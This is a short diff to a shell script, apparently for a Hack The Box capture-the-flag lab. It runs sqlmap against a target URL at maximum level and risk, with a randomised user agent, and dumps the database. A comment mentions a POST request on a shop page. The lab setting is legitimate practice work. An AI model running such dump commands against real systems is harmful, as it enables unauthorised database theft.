@@ -9,6 +9,10 @@ UINPROTO=""
 
 TGTHOST=$UINHOST$UINPROTO
 
-sqlmap --batch --dump -u '$TGTHOST'
+sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3
 
 # Flag regex: (HTB{.+})
+
+# found a post request for /shop.html when adding shoes to cart
+# ran command to get max result, probably not best for realworld
+sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3
